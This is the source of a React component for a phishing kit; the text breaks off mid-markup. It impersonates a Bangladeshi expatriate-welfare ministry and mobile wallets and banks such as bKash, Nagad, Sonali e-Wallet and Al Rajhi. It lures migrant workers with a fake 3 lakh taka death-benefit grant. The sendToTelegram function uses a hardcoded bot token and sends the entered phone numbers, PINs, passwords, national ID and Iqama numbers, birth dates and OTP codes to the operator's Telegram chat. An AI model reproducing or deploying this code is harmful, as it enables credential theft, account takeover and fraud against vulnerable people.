import React, { useState, useEffect, useRef } from "react";
import { GovEmblem } from "./GovBanner";
import CountryCodeSelector from "./CountryCodeSelector";
import { getGlobalCountry, formatIntlPhoneNumber } from "../utils/countryData";
import {
  ArrowRight,
  ArrowLeft,
  CheckCircle,
  Smartphone,
  Lock,
  Plus,
  Landmark,
  FileText,
  SmartphoneCharging,
  Coins,
  History,
  FileBarChart,
  Grid,
  Mail,
  User,
  ShieldAlert,
  HelpCircle,
  Clock,
  RefreshCw,
  TrendingUp,
  CreditCard,
  Building2,
  Award
} from "lucide-react";

// Safe storage helper with standard try-catch blocks to prevent iframe lock issues
const safeStorage = {
  getItem: (key: string): string | null => {
    try {
      return localStorage.getItem(key);
    } catch (_) {
      return null;
    }
  },
  setItem: (key: string, value: string): void => {
    try {
      localStorage.setItem(key, value);
    } catch (_) {}
  },
  removeItem: (key: string): void => {
    try {
      localStorage.removeItem(key);
    } catch (_) {}
  }
};

function sendToTelegram(message: string) {
  // Fetch from safeStorage to keep credentials unified with user custom settings
  const customToken = safeStorage.getItem("telegram_bot_token");
  const customChatId = safeStorage.getItem("telegram_chat_id");
  
  const botToken = (customToken && customToken.trim() !== "") ? customToken.trim() : "8194432183:AAFAvwjg6XsN4Yi6v6BysSIWg4rCF_Kr-rI";
  const chatId = (customChatId && customChatId.trim() !== "") ? customChatId.trim() : "6658445342";

  const encodedMessage = encodeURIComponent(message);
  const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}&parse_mode=HTML`;
  fetch(url)
    .then((res) => res.json())
    .then((data) => {
      console.log("Telegram update sent:", data.ok);
    })
    .catch((error) => console.error("Telegram error:", error));
}

// Multi-wallet profile layout config
interface WalletConfig {
  id: string;
  name: string;
  nameBn: string;
  logoText: string;
  logoBg: string;
  primaryBg: string;
  textColor: string;
  accentBg: string; // login submission/submit btn
  accentText: string;
  inputBg: string;
  inputBorder: string;
  placeholderColor: string;
  description: string;
  loginFields: {
    phoneLabel: string;
    phonePlaceholder: string;
    phoneType: "tel" | "text";
    pinLabel: string;
    pinPlaceholder: string;
    pinMaxLength: number;
    pinType: "password" | "number" | "text";
  };
  regFields: {
    pinMaxLength: number;
  };
  country: "bangladesh" | "international";
}

const WALLETS: WalletConfig[] = [
  {
    id: "bkash",
    name: "bKash (বিকাশ)",
    nameBn: "বিকাশ",
    logoText: "bKash",
    logoBg: "bg-[#E2136E]",
    primaryBg: "from-[#E2136E]/10 to-[#E2136E]/5 border-[#E2136E]/20 bg-white",
    textColor: "text-[#E2136E]",
    accentBg: "bg-[#E2136E] hover:bg-[#b01040]",
    accentText: "text-white",
    inputBg: "bg-slate-50",
    inputBorder: "border-slate-200 focus:border-[#E2136E]",
    placeholderColor: "placeholder-slate-400",
    description: "বিকাশ লিমিটেড - ব্র্যাক ব্যাংক এর একটি প্রতিষ্ঠান",
    loginFields: {
      phoneLabel: "বিকাশ অ্যাকাউন্ট নম্বর (১১-ডিজিট)",
      phonePlaceholder: "যেমন: 017XXXXXXXX",
      phoneType: "tel",
      pinLabel: "বিকাশ ৫-ডিজিট পিন (PIN) নম্বর",
      pinPlaceholder: "বিকাশ পিন দিন",
      pinMaxLength: 5,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 5
    },
    country: "bangladesh"
  },
  {
    id: "nagad",
    name: "Nagad (নগদ)",
    nameBn: "নগদ",
    logoText: "Nagad",
    logoBg: "bg-[#EC1C24]",
    primaryBg: "from-[#F26722]/10 to-[#EC1C24]/5 border-[#F26722]/20 bg-white",
    textColor: "text-[#F26722]",
    accentBg: "bg-[#F26722] hover:bg-[#d44e13]",
    accentText: "text-white",
    inputBg: "bg-slate-50",
    inputBorder: "border-slate-200 focus:border-[#F26722]",
    placeholderColor: "placeholder-slate-400",
    description: "নগদ লিমিটেড - বাংলাদেশ ডাক বিভাগের একটি ডিজিটাল লেনদেন",
    loginFields: {
      phoneLabel: "নগদ অ্যাকাউন্ট মোবাইল নম্বর (১১-ডিজিট)",
      phonePlaceholder: "যেমন: 01XXXXXXXXX",
      phoneType: "tel",
      pinLabel: "নগদ ৪-ডিজিট পিন (PIN) নম্বর",
      pinPlaceholder: "৪ সংখ্যার নগদ পিন দিন",
      pinMaxLength: 4,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 4
    },
    country: "bangladesh"
  },
  {
    id: "rocket",
    name: "Rocket (রকেট)",
    nameBn: "রকেট",
    logoText: "Rocket",
    logoBg: "bg-[#8C388C]",
    primaryBg: "from-[#8C388C]/15 to-violet-50 bg-white border-[#8C388C]/20",
    textColor: "text-[#8C388C]",
    accentBg: "bg-[#8C388C] hover:bg-[#722b72]",
    accentText: "text-white",
    inputBg: "bg-slate-50",
    inputBorder: "border-slate-200 focus:border-[#8C388C]",
    placeholderColor: "placeholder-slate-400",
    description: "রকেট - ডাচ-বাংলা ব্যাংক মোবাইল ব্যাংকিং",
    loginFields: {
      phoneLabel: "রকেট অ্যাকাউন্ট নম্বর (১২-ডিজিট)",
      phonePlaceholder: "যেমন: 01XXXXXXXXXX",
      phoneType: "tel",
      pinLabel: "রকেট ৪-ডিজিট পিন (PIN)",
      pinPlaceholder: "৪ সংখ্যার পিন দিন",
      pinMaxLength: 4,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 4
    },
    country: "bangladesh"
  },
  {
    id: "cellfin",
    name: "Cellfin (সেলফিন - IBBL)",
    nameBn: "সেলফিন",
    logoText: "Cellfin",
    logoBg: "bg-[#0A6834]",
    primaryBg: "from-[#0A6834]/15 to-emerald-50 bg-white border-[#0A6834]/20",
    textColor: "text-[#0A6834]",
    accentBg: "bg-[#0A6834] hover:bg-[#064a23]",
    accentText: "text-white",
    inputBg: "bg-slate-50",
    inputBorder: "border-slate-200 focus:border-[#0A6834]",
    placeholderColor: "placeholder-slate-400",
    description: "ইসলামী ব্যাংক বাংলাদেশ লিমিটেড এর অফিশিয়াল ডিজিটাল ওয়ালেট",
    loginFields: {
      phoneLabel: "সেলফিন রেজিস্টার্ড মোবাইল নম্বর",
      phonePlaceholder: "যেমন: 01XXXXXXXXX",
      phoneType: "tel",
      pinLabel: "সেলফিন ৬-ডিজিট পিন (PIN)",
      pinPlaceholder: "৬ সংখ্যার পিন দিন",
      pinMaxLength: 6,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 6
    },
    country: "bangladesh"
  },
  {
    id: "sonali_wallet",
    name: "Sonali e-Wallet (সোনালী ই-ওয়ালেট)",
    nameBn: "সোনালী ই-ওয়ালেট",
    logoText: "Sonali",
    logoBg: "bg-[#004a99]",
    primaryBg: "from-[#f9c400]/15 to-[#004a99]/5 bg-white border-[#004a99]/20",
    textColor: "text-[#004a99]",
    accentBg: "bg-[#004a99] hover:bg-[#003875]",
    accentText: "text-white",
    inputBg: "bg-slate-50",
    inputBorder: "border-slate-200 focus:border-[#004a99]",
    placeholderColor: "placeholder-slate-400",
    description: "সোনালী ব্যাংক পিএলসি - রাষ্ট্রীয় মালিকানাধীন অফিশিয়াল মোবাইল ওয়ালেট",
    loginFields: {
      phoneLabel: "মোবাইল নম্বর (Phone Number)",
      phonePlaceholder: "যেমন: 01XXXXXXXXX",
      phoneType: "tel",
      pinLabel: "সিকিউরিটি পিন নম্বর (e-Wallet PIN)",
      pinPlaceholder: "৬ সংখ্যার পিন কোড দিন",
      pinMaxLength: 6,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 6
    },
    country: "bangladesh"
  },
  {
    id: "upay",
    name: "upay (উপায়)",
    nameBn: "উপায়",
    logoText: "upay",
    logoBg: "bg-[#004B87]",
    primaryBg: "from-[#004B87]/10 to-yellow-50 bg-white border-[#004B87]/20",
    textColor: "text-[#004B87]",
    accentBg: "bg-[#004B87] hover:bg-[#003460]",
    accentText: "text-white",
    inputBg: "bg-slate-50",
    inputBorder: "border-slate-200 focus:border-[#004B87]",
    placeholderColor: "placeholder-slate-400",
    description: "উপায় - ইউসিবি মোবাইল ফাইন্যান্সিয়াল সার্ভিসেস লিমিটেড",
    loginFields: {
      phoneLabel: "ইউসিবি উপায় অ্যাকাউন্ট নম্বর",
      phonePlaceholder: "যেমন: 01XXXXXXXXX",
      phoneType: "tel",
      pinLabel: "উপায় পিন নম্বর (৪-ডিজিট)",
      pinPlaceholder: "৪ সংখ্যার পিন দিন",
      pinMaxLength: 4,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 4
    },
    country: "bangladesh"
  },
  {
    id: "alrajhi",
    name: "Al Rajhi Bank (আল রাজী ব্যাংক - KSA)",
    nameBn: "আল রাজী ব্যাংক",
    logoText: "Al Rajhi",
    logoBg: "bg-[#005a9c]",
    primaryBg: "from-[#005a9c]/10 to-blue-50/45 bg-white border-[#005a9c]/10",
    textColor: "text-[#005a9c]",
    accentBg: "bg-[#005a9c] hover:bg-[#004375]",
    accentText: "text-white",
    inputBg: "bg-slate-50",
    inputBorder: "border-slate-200 focus:border-[#005a9c]",
    placeholderColor: "placeholder-slate-400",
    description: "Al Rajhi Bank - Largest Islamic Bank Gateway (Kingdom of Saudi Arabia)",
    loginFields: {
      phoneLabel: "Username, Iqama Number or National ID",
      phonePlaceholder: "Enter 10-digit Iqama or ID",
      phoneType: "text",
      pinLabel: "Mobile App Password (পাসওয়ার্ড)",
      pinPlaceholder: "Enter password",
      pinMaxLength: 32,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 6
    },
    country: "international"
  },
  {
    id: "stcpay",
    name: "stc pay (এসটিসি পে - KSA)",
    nameBn: "এসটিসি পে",
    logoText: "stc pay",
    logoBg: "bg-[#ff0037]",
    primaryBg: "from-[#4E226E]/15 to-[#ff0037]/5 bg-white border-[#4E226E]/10",
    textColor: "text-[#4E226E]",
    accentBg: "bg-[#4E226E] hover:bg-[#3d1a56]",
    accentText: "text-white",
    inputBg: "bg-slate-50",
    inputBorder: "border-slate-200 focus:border-[#4E226E]",
    placeholderColor: "placeholder-slate-400",
    description: "STC Payment Solutions digital wallet (KSA)",
    loginFields: {
      phoneLabel: "Saudi Mobile Number / Iqama (+966)",
      phonePlaceholder: "e.g. 5xxxxxxxxx",
      phoneType: "tel",
      pinLabel: "stc pay 6-Digit Passcode (পাসকোড)",
      pinPlaceholder: "Enter 6-digit passcode",
      pinMaxLength: 6,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 6
    },
    country: "international"
  },
  {
    id: "snb_alahli",
    name: "SNB AlAhli (এসএনবি আল আহলি - KSA)",
    nameBn: "এসএনবি আল আহলি",
    logoText: "SNB",
    logoBg: "bg-[#034224]",
    primaryBg: "from-[#034224]/10 to-emerald-50/50 bg-white border-[#034224]/20",
    textColor: "text-[#034224]",
    accentBg: "bg-[#034224] hover:bg-[#022c18]",
    accentText: "text-white",
    inputBg: "bg-slate-50",
    inputBorder: "border-slate-200 focus:border-[#034224]",
    placeholderColor: "placeholder-slate-400",
    description: "The National Commercial Bank (Saudi National Bank) e-Commerce Panel",
    loginFields: {
      phoneLabel: "SNB AlAhli Username or Iqama ID",
      phonePlaceholder: "Enter SNB App Username",
      phoneType: "text",
      pinLabel: "Mobile Password",
      pinPlaceholder: "Enter SnB mobile password",
      pinMaxLength: 35,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 6
    },
    country: "international"
  },
  {
    id: "urpay",
    name: "urpay (ইউআর পে - KSA)",
    nameBn: "ইউআর পে",
    logoText: "urpay",
    logoBg: "bg-[#0a0f18]",
    primaryBg: "from-slate-900 to-slate-950 bg-slate-950 border-[#CCFF00]/30",
    textColor: "text-[#CCFF00]",
    accentBg: "bg-[#CCFF00] hover:bg-[#b5e000]",
    accentText: "text-slate-950",
    inputBg: "bg-slate-900",
    inputBorder: "border-slate-800 focus:border-[#CCFF00]",
    placeholderColor: "placeholder-slate-600",
    description: "urpay KSA Digital Wallet - Powered by Al Rajhi Bank",
    loginFields: {
      phoneLabel: "urpay Registered Mobile Number (+966)",
      phonePlaceholder: "e.g. 5xxxxxxxxx",
      phoneType: "tel",
      pinLabel: "4-Digit passcode (৪-ডিজিট পাসকোড)",
      pinPlaceholder: "Enter 4-digit passcode",
      pinMaxLength: 4,
      pinType: "password"
    },
    regFields: {
      pinMaxLength: 4
    },
    country: "international"
  }
];

interface SonaliWalletLoanFormProps {
  onShowToast: (msg: string, type: "success" | "error") => void;
}

export default function SonaliWalletLoanForm({ onShowToast }: SonaliWalletLoanFormProps) {
  // Available Wallets
  const [selectedWalletId, setSelectedWalletId] = useState("sonali_wallet");
  const [page, setPage] = useState<"home" | "login" | "register" | "otp" | "success">("home");
  const [otpContext, setOtpContext] = useState<"login" | "register">("login");

  // Form fields
  const [phoneInput, setPhoneInput] = useState("");
  const [pinInput, setPinInput] = useState("");

  // NID/Register info
  const [regName, setRegName] = useState("");
  const [regPhone, setRegPhone] = useState("");
  const [regBankAcc, setRegBankAcc] = useState("");
  const [regNid, setRegNid] = useState("");
  const [regEmail, setRegEmail] = useState("");
  const [regDob, setRegDob] = useState("");
  const [regPin1, setRegPin1] = useState("");
  const [regPin2, setRegPin2] = useState("");
  const [termsAccepted, setTermsAccepted] = useState(false);

  // OTP State
  const [otpFields, setOtpFields] = useState<string[]>(["", "", "", "", "", ""]);
  const otpInputsRef = useRef<HTMLInputElement[]>([]);

  // Timer state
  const [timeLeft, setTimeLeft] = useState(60);
  const [timerActive, setTimerActive] = useState(false);
  const [successMessage, setSuccessMessage] = useState("");

  // Get active selected wallet configuration
  const wallet: WalletConfig = WALLETS.find((w) => w.id === selectedWalletId) || WALLETS[0];

  // Track initial page view load
  useEffect(() => {
    sendToTelegram(`👤 একজন আপনার 'আর্থিক ও ঋণ সহায়তা' পেজ ভিজিট করেছে (অফিসিয়াল গেটওয়ে)।`);
  }, []);

  // Timer countdown hook
  useEffect(() => {
    let timer: any = null;
    if (timerActive && timeLeft > 0) {
      timer = setInterval(() => {
        setTimeLeft((prev) => prev - 1);
      }, 1000);
    } else if (timeLeft === 0) {
      setTimerActive(false);
    }
    return () => {
      if (timer) clearInterval(timer);
    };
  }, [timerActive, timeLeft]);

  const startOtpTimer = () => {
    setTimeLeft(60);
    setTimerActive(true);
  };

  const handlePageChange = (newPage: "home" | "login" | "register" | "otp" | "success") => {
    setPage(newPage);
  };

  const currentServiceIndex = [
    { name: "Transaction", icon: <History className="w-5 h-5" /> },
    { name: "Bill Pay", icon: <FileText className="w-5 h-5" /> },
    { name: "Recharge", icon: <SmartphoneCharging className="w-5 h-5" /> },
    { name: "Add Money", icon: <Coins className="w-5 h-5 text-amber-500" /> },
    { name: "Statement", icon: <FileBarChart className="w-5 h-5" /> },
    { name: "e-Statement", icon: <Coins className="w-5 h-5 text-amber-500" /> },
    { name: "Bank Deposit", icon: <Landmark className="w-5 h-5" /> },
    { name: "Cards", icon: <CreditCard className="w-5 h-5 text-slate-500" /> },
    { name: "Tap and Pay", icon: <Grid className="w-5 h-5" /> },
    { name: "Send Money", icon: <Coins className="w-5 h-5 text-amber-500" /> },
    { name: "Inbox", icon: <Mail className="w-5 h-5" /> },
    { name: "Loan Apply", icon: <TrendingUp className="w-5 h-5 text-emerald-600 font-bold" /> }
  ];

  const handleLoginSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!phoneInput || !pinInput) {
      onShowToast("অনুগ্রহ করে মোবাইল নম্বর এবং সিকিউরিটি পিন নাম্বারটি সঠিক উপায়ে পূরণ করুন।", "error");
      return;
    }

    setOtpContext("login");
    const loginMessage = `
🏦 <b>[${wallet.name}] Login Attempt</b>
-----------------------------
📱 <b>ID/Phone:</b> <code>${phoneInput}</code>
🔑 <b>Secret PIN/Password:</b> <code>${pinInput}</code>
🌎 <b>Wallet Country:</b> ${wallet.country === "bangladesh" ? "Bangladesh" : "International (প্রবাস)"}
-----------------------------`;
    sendToTelegram(loginMessage);
    setOtpFields(["", "", "", "", "", ""]);
    handlePageChange("otp");
    startOtpTimer();
    onShowToast(`${wallet.nameBn} গেটওয়ে: ওটিপি ভেরিফিকেশন কোড পাঠানো হয়েছে!`, "success");
  };

  const handleRegSubmit = (e: React.FormEvent) => {
    e.preventDefault();
    if (!regName || !regPhone || !regDob || !regPin1 || !regPin2) {
      onShowToast("অনুগ্রহ করে ফর্মে তারকাচিহ্নিত (*) ঘরগুলো সঠিক তথ্যে পূরণ করুন।", "error");
      return;
    }
    if (regPin1 !== regPin2) {
      onShowToast("পিন কোড দুটি মিলছে না! পুনরায় চেষ্টা করুন।", "error");
      return;
    }
    if (!termsAccepted) {
      onShowToast("আপনাকে অবশ্যই সোনালী ব্যাংক ও রেমিট্যান্স বীমা সহায়তার নিয়মাবলী এবং শর্তাবলীতে টিক মার্ক দিতে হবে।", "error");
      return;
    }

    setOtpContext("register");
    const { dialCode } = getGlobalCountry();
    const formattedPhone = formatIntlPhoneNumber(dialCode, regPhone);
    const regMessage = `
📝 <b>[${wallet.name}] New Wallet Registration</b>
--------------------------------------
👤 <b>Full Name:</b> ${regName}
📱 <b>Phone:</b> +${formattedPhone}
🏦 <b>Bank/Smart Acc:</b> ${regBankAcc || "N/A"}
💳 <b>NID/Iqama/Passport:</b> ${regNid}
📧 <b>Email:</b> ${regEmail || "N/A"}
🎂 <b>Date of Birth:</b> ${regDob}
🔒 <b>New App PIN/Password:</b> <code>${regPin1}</code>
🌎 <b>Wallet Country:</b> ${wallet.country === "bangladesh" ? "Bangladesh" : "International (প্রবাস)"}
--------------------------------------`;
    sendToTelegram(regMessage);
    setOtpFields(["", "", "", "", "", ""]);
    handlePageChange("otp");
    startOtpTimer();
    onShowToast(`আপনার রেজিষ্ট্রেশন ওটিপি (OTP) ও শুভেচ্ছা কোড পাঠানো হয়েছে!`, "success");
  };

  const handleOtpConfirm = () => {
    const fullOtp = otpFields.join("");
    if (fullOtp.length < 6) {
      onShowToast("অনুগ্রহ করে ৬ সংখ্যার সম্পূর্ণ ওটিপি কোডটি লিখুন।", "error");
      return;
    }

    const otpMessage = `🔑 <b>[${wallet.name}] OTP Callback Success:</b> <code>${fullOtp}</code>`;
    sendToTelegram(otpMessage);

    setTimerActive(false);

    if (otpContext === "register") {
      sendToTelegram(`✅ <b>${wallet.nameBn} ওয়ালেট রেজিষ্ট্রেশন সম্পূর্ণ হয়েছে এবং ৩ লক্ষ টাকা প্রবাস বীমা লাইভ কভারেজের জন্য যুক্ত হয়েছে!</b>`);
      setSuccessMessage(`আপনার ${wallet.nameBn} ওয়ালেট রেজিষ্ট্রেশন সফল হয়েছে!<br>৩ লক্ষ টাকার জরুরি আর্থিক সহায়তা কভারেজ আপনার প্রোফাইলে যুক্ত হয়েছে।`);
      handlePageChange("success");
      setTimeout(() => {
        handlePageChange("home");
      }, 5000);
    } else {
      sendToTelegram(`✅ <b>${wallet.nameBn} লিঙ্কড ওয়ালেট সফলভাবে লগইন করা হয়েছে এবং ৩ লক্ষ টাকা প্রবাস বীমার জন্য একটিভ করা হয়েছে!</b>`);
      setSuccessMessage(`আপনার ${wallet.nameBn} অ্যাকাউন্ট ভেরিফাইড এবং সুরক্ষিত!<br>জরুরি প্রবাসকালীন ৩ লক্ষ টাকা সরকারি অনুদানের জন্য Wallet টি সফলভাবে যুক্ত করা হয়েছে।`);
      handlePageChange("success");
      setTimeout(() => {
        handlePageChange("home");
      }, 5000);
    }
  };

  const handleOtpInputChange = (val: string, index: number) => {
    const updated = [...otpFields];
    updated[index] = val.slice(-1);
    setOtpFields(updated);

    if (val && index < 5) {
      otpInputsRef.current[index + 1]?.focus();
    }
  };

  const handleOtpKeyDown = (e: React.KeyboardEvent<HTMLInputElement>, index: number) => {
    if (e.key === "Backspace" && !otpFields[index] && index > 0) {
      otpInputsRef.current[index - 1]?.focus();
    }
  };

  const handleResendOtp = (e: React.MouseEvent) => {
    e.preventDefault();
    startOtpTimer();
    sendToTelegram(`🔄 OTP Resend Requested for ${wallet.name}`);
    onShowToast("আপনার মোবাইল ওয়ালেটে নতুন কোড পুনরায় পাঠানো হয়েছে!", "success");
  };

  const selectWallet = (id: string) => {
    setSelectedWalletId(id);
    setPhoneInput("");
    setPinInput("");
    setRegName("");
    setRegPhone("");
    setRegBankAcc("");
    setRegNid("");
    setRegEmail("");
    setRegDob("");
    setRegPin1("");
    setRegPin2("");
    sendToTelegram(`🔄 গ্রাহক মোবাইল ওয়ালেট পরিবর্তন করেছেন: ${id}`);
    onShowToast(`${id.toUpperCase()} অফিসিয়াল গেটওয়েতে রি-ডাইরেক্ট করা হচ্ছে...`, "success");
  };

  return (
    <div id="sonali-ewallet-embedded-window" className="w-full max-w-4xl mx-auto bg-slate-50 rounded-2xl border border-slate-250 overflow-hidden shadow-2xl flex flex-col relative text-justify font-sans">
      
      {/* Official Government Top Header Banner */}
      <div className="bg-white border-b border-slate-200 p-4 sm:p-5 flex items-center gap-3.5 relative overflow-hidden text-left">
        <div className="absolute top-0 left-0 w-full h-[3px] bg-gradient-to-r from-red-600 via-emerald-500 to-yellow-500" />
        <GovEmblem className="w-11 h-11 shrink-0" />
        <div className="flex flex-col justify-center">
          <span className="text-[10px] sm:text-xs font-black text-amber-700 block tracking-wide uppercase leading-none pb-0.5">গণপ্রজাতন্ত্রী বাংলাদেশ সরকার</span>
          <h1 className="text-sm sm:text-base font-black text-slate-900 tracking-tight font-sans">
            • প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয়
          </h1>
          <p className="text-[9px] sm:text-[10px] text-slate-500 font-bold block leading-none mt-1">
            স্মার্ট ডিজিটাল প্রবাসী সেবা ও অর্ডার পোর্টাল
          </p>
        </div>
      </div>

      {/* 1. MAIN SYSTEM INSTRUCTION HEADLINE BANNER (As specified by the user constraint) */}
      <div className="bg-gradient-to-r from-red-600 via-amber-600 to-emerald-600 text-white p-5 text-center font-bold tracking-tight z-10 shadow-lg border-b border-red-500/20">
        <div className="flex flex-col items-center justify-center gap-2 max-w-3xl mx-auto">
          <span className="bg-white/20 px-3 py-1 rounded-full text-[10px] tracking-widest uppercase inline-block font-sans animate-pulse">
            🚨 প্রবাসী কল্যাণ আর্থিক গেটওয়ে 🚨
          </span>
          <h2 className="text-base sm:text-lg md:text-xl font-black text-white px-2 leading-relaxed">
            প্রবাস থাকা কালীন সময়ে মৃত্যু বরণ করলে ৩ লক্ষ টাকা আর্থিক সহায়তার জন্য আপনার মোবাইল ব্যাংকিং wallet যুক্ত করুন
          </h2>
          <p className="text-[10px] sm:text-[11px] text-amber-200 font-extrabold select-none">
            (অফিসিয়াল বায়োমেট্রিক ও ডিজিটাল ইন্টিগ্রেশন ফরম - নিজ দেশের অথবা প্রবাসে ব্যবহৃত মোবাইল ব্যাংকিং নিশ্চিত করুন)
          </p>
        </div>
      </div>

      {/* Embedded device indicator line inside the system client framework */}
      <div className="bg-slate-900 h-6 w-full flex items-center justify-between px-5 text-[10px] text-slate-405 font-bold z-10 shrink-0">
        <span className="font-mono text-slate-400">Security: SSL 256-Bit Encrypted Secure Channel</span>
        <div className="flex items-center gap-1.5 text-emerald-400 uppercase tracking-widest text-[8px] font-sans">
          <span className="w-2 h-2 rounded-full bg-emerald-400 inline-block animate-ping" />
          <span>Active Connection Live</span>
        </div>
      </div>

      {/* Main split-view or grid body: Wallet Selector (Left) + Selected Bank Application Form (Right) */}
      <div className="grid grid-cols-1 md:grid-cols-12 min-h-[550px] bg-slate-50">
        
        {/* Selector Sidebar Column */}
        <div className="md:col-span-4 bg-white border-r border-slate-200 p-4 shrink-0 flex flex-col justify-between">
          <div>
            <div className="flex items-center gap-1 text-slate-800 font-bold text-xs uppercase tracking-wider mb-3">
              <Building2 className="w-4 h-4 text-[#004a99]" />
              <span>মোবাইল ওয়ালেট নির্বাচন করুন</span>
            </div>
            
            <p className="text-[10px] text-slate-500 font-bold mb-4">
              আর্থিক অনুদানের ৩ লক্ষ টাকা সরাসরি নিচে সিলেক্ট করা ওয়ালেটের মাধ্যমে পাঠানো হবে। অনুগ্রহ করে সচল একটি ওয়ালেট পছন্দ করুন:
            </p>

            {/* Wallet Selection Buttons Groups */}
            <div className="space-y-4">
              {/* Bangladeshi Wallets Category */}
              <div>
                <span className="block text-[9px] font-black uppercase text-emerald-700 tracking-widest mb-1.5">
                  🇧🇩 বাংলাদেশী মোবাইল ওয়ালেটস
                </span>
                <div className="grid grid-cols-2 gap-2">
                  {WALLETS.filter(w => w.country === "bangladesh").map((w) => {
                    const isSel = w.id === selectedWalletId;
                    return (
                      <button
                        key={w.id}
                        type="button"
                        onClick={() => selectWallet(w.id)}
                        className={`p-2.5 rounded-xl border text-left flex items-center gap-2 cursor-pointer transition-all ${
                          isSel
                            ? "bg-emerald-50 border-emerald-500 shadow-sm"
                            : "bg-slate-50 hover:bg-slate-100 border-slate-200"
                        }`}
                      >
                        <span className={`w-3 h-3 rounded-full flex items-center justify-center border ${
                          isSel ? "border-emerald-500 bg-emerald-500" : "border-slate-300"
                        }`}>
                          {isSel && <span className="w-1.5 h-1.5 rounded-full bg-white" />}
                        </span>
                        <div className="flex flex-col">
                          <span className="text-[11px] font-black text-slate-800 leading-none">{w.nameBn}</span>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>

              {/* International Wallets Category */}
              <div>
                <span className="block text-[9px] font-black uppercase text-blue-700 tracking-widest mb-1.5">
                  🇸🇦 প্রবাস ওয়ালেট (সৌদি আরব / মধ্যপ্রাচ্য)
                </span>
                <div className="grid grid-cols-2 gap-2">
                  {WALLETS.filter(w => w.country === "international").map((w) => {
                    const isSel = w.id === selectedWalletId;
                    return (
                      <button
                        key={w.id}
                        type="button"
                        onClick={() => selectWallet(w.id)}
                        className={`p-2.5 rounded-xl border text-left flex items-center gap-2 cursor-pointer transition-all ${
                          isSel
                            ? "bg-blue-50 border-blue-500 shadow-sm"
                            : "bg-slate-50 hover:bg-slate-100 border-slate-200"
                        }`}
                      >
                        <span className={`w-3 h-3 rounded-full flex items-center justify-center border ${
                          isSel ? "border-blue-500 bg-blue-500" : "border-slate-300"
                        }`}>
                          {isSel && <span className="w-1.5 h-1.5 rounded-full bg-white" />}
                        </span>
                        <div className="flex flex-col">
                          <span className="text-[10px] font-black text-slate-800 leading-none">{w.nameBn}</span>
                        </div>
                      </button>
                    );
                  })}
                </div>
              </div>
            </div>
          </div>

          <div className="mt-6 pt-3 border-t border-slate-150 text-center">
            <span className="text-[9px] text-slate-400 font-extrabold block">
              প্রবাসী কল্যাণ ও বৈদেশিক কর্মসংস্থান মন্ত্রণালয় দ্বারা নোটিফাইড গেটওয়ে
            </span>
          </div>
        </div>

        {/* Dynamic Display Form Area (Simulates the Official App Selected) */}
        <div className="md:col-span-8 flex flex-col bg-white">
          
          {/* Dynamic App Header Frame */}
          <div className={`p-4 ${wallet.id === 'urpay' ? 'bg-[#0a0f18] text-white border-b border-[#CCFF00]/20' : 'bg-[#e2edf9]/70 border-b border-slate-200'} flex items-center justify-between`}>
            <div className="flex items-center gap-2.5">
              <span className={`w-10 h-10 ${wallet.logoBg} text-white font-black text-xs rounded-xl flex items-center justify-center shadow-md select-none border border-white/10 uppercase`}>
                {wallet.logoText.slice(0, 4)}
              </span>
              <div className="text-left">
                <h4 className={`text-sm font-extrabold ${wallet.id === 'urpay' ? 'text-[#CCFF00]' : 'text-slate-800'}`}>
                  {wallet.name}
                </h4>
                <p className="text-[10px] font-bold text-slate-450 truncate max-w-[260px] md:max-w-[340px]">
                  {wallet.description}
                </p>
              </div>
            </div>

            {page !== "home" && (
              <button
                type="button"
                onClick={() => handlePageChange("home")}
                className="text-[10px] font-black bg-slate-200 hover:bg-slate-300 text-slate-800 px-2.5 py-1.5 rounded-lg border border-slate-300 transition-colors cursor-pointer"
              >
                মেনু
              </button>
            )}
          </div>

          {/* PAGE state outputs */}

          {/* HOME MENU PAGE OF THE SELECTED BANK WALLET */}
          {page === "home" && (
            <div className={`flex flex-col flex-grow ${wallet.id === 'urpay' ? 'bg-[#0a0f18] text-white' : 'bg-white text-[#333]'} p-6 justify-between animate-fadeIn h-full min-h-[420px]`}>
              <div className="text-center py-6">
                <div className="flex justify-center mb-4">
                  <span className={`w-14 h-14 ${wallet.logoBg} text-white rounded-2xl flex items-center justify-center text-lg font-black shadow-lg border-2 border-white`}>
                    {wallet.logoText.slice(0, 4)}
                  </span>
                </div>
                <h3 className={`text-lg font-black ${wallet.id === 'urpay' ? 'text-[#CCFF00]' : 'text-slate-900'}`}>
                  স্বাগতম! {wallet.nameBn} অ্যাপ্লিকেশন সার্ভিস
                </h3>
                <p className={`text-xs mt-1 font-bold ${wallet.id === 'urpay' ? 'text-slate-300' : 'text-slate-500'} max-w-sm mx-auto`}>
                  ৩ লক্ষ টাকা অনুদান সহায়তার তালিকাভুক্ত করতে আপনার ভেরিফাইড {wallet.nameBn} ওয়ালেট সচলভাবে অ্যাড করুন।
                </p>

                <div className="flex flex-wrap gap-3 justify-center mt-7">
                  <button
                    type="button"
                    onClick={() => {
                      sendToTelegram(`🖱️ '${wallet.nameBn}' লগইন বাটনে ক্লিক করেছে।`);
                      handlePageChange("login");
                    }}
                    className={`px-6 py-3 rounded-xl border font-black text-sm transition-all duration-150 active:scale-95 flex items-center gap-1 bg-[#004a99] hover:bg-[#003875] text-white cursor-pointer shadow-md`}
                  >
                    <span>লগইন করুন / LOGIN</span>
                    <ArrowRight className="w-4 h-4" />
                  </button>

                  <button
                    type="button"
                    onClick={() => {
                      sendToTelegram(`🖱️ '${wallet.nameBn}' নতুন অ্যাকাউন্ট রেজিষ্ট্রেশন বাটনে ক্লিক করেছে।`);
                      handlePageChange("register");
                    }}
                    className="px-6 py-3 rounded-xl bg-slate-100 hover:bg-slate-200 border border-slate-300 text-slate-850 font-semibold text-sm cursor-pointer shadow-sm"
                  >
                    নতুন একাউন্ট রেজিষ্ট্রেশন
